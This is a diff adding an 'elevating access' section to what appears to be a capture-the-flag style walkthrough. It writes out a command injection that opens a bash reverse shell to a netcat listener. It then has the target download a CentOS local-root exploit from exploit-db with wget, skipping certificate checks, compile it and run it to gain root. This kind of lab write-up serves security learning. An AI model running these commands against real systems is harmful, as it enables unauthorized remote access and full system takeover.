@@ -46,4 +46,24 @@ Looks like the idea was right. We can see that after the ping results, there's a
 
 ## Elevating access
 
-Let's try to achieve an interactive way to talk to the target machine. Since we can execute a command with the administrative web console, we can use `nc` on both our attacking machine and on the console to start an interactive session. 
+Let's try to achieve an interactive way to talk to the target machine. Since we can execute a command with the administrative web console, we can use `nc` on our attacking machine and `bash` on the console to start an interactive session. The command `nc -lvp 4444` on our attacking system allows us to listen on port 4444 for incoming connections and provide verbose output. After this is listening, we can submit `; bash -i >& /dev/tcp/10.0.2.5/4444 0<&1` into the text box and this will connect our two machines with an interactive session. The arguments to the `bash` command will run a new interactive instance of bash with standard output and standard error being redirected to a TCP connection to the chosen IP address and port, in this case our attacker's VM and the port that `nc` is listening on, and that standard input will be read through this connection.
+
+![](images/connected.png "The two machines now have an interactive session")
+
+After submitting this, the web browser will display a constantly loading page and our `nc` listener will now have a `bash` shell waiting for us.
+
+Now that we're connected to the target machine, we need to find a way to gain root access, as the apache user we're logged in as doesn't have sudo or root privileges. We're going to see what directory we're currently in with the `pwd` command, and we'll use `ls -l` to see if we're allowed to write to any files in our current directory. Then, we'll attempt to find out what specific operating system the target machine is running with `uname -a`, `lsb_release -a`, and `cat /etc/*-release` to see if there are any useful local exploits we can run.
+
+![](images/info.png "Information gathered about our target system")
+
+From the results of these commands, we can see that we're currently in the /var/www/html directory, where we are not allowed to write to any files, and that the target is running CentOS 4.5. We can use the `searchsploit` command again on our attacking machine to see if we can find any local privilege escalation exploits that we can use. Running `searchsploit centos local -o` will show all of the local exploits available for CentOS, with the `-o` flag allowing the exploit names to be fully shown. While it may not look pretty, it will help us find the exploit we want easier.
+
+![](images/centos.png "searchsploit centos local -o shows us the available local exploits for CentOS")
+
+We can see that there are a few local privilege escalation exploits to choose from, and after trying them all, I've found that exploits/linux/local/9545.c is the one that works best. Now, we need to get the exploit loaded on the target machine.
+
+Since the apache user can't write to the current directory it's in, we will use the /tmp directory, which can be written to and read by any user. A simple `cd /tmp` will take us there. We can then use the `wget` command to download the exploit source code from [exploit-db](https://www.exploit-db.com/raw/9542/ "The source code for the exploit we're using") onto the target. The specific command we'll use will be `wget --no-check-certificate http://www.exploit-db.com/raw/9542 -O exploit.c`, which will bypass certificate verification (you shouldn't do this unless you are convinced of the site's authenticity or you don't care about the validity of its certificate), and download the contents of the page into the exploit.c file.
+
+Once the exploit is downloaded, we can use `gcc` to compile it because it's source code written in C. After you compile the exploit with `gcc exploit.c`, there will be an executable file called a.out, and now you can run the exploit with `./a.out`. We can see that the exploit worked because our prompt symbol changed from `$` to `#`, and if we run `whoami`, we can see that we are now root!
+
+![](images/escalation.png "Downloading and executing the exploit")
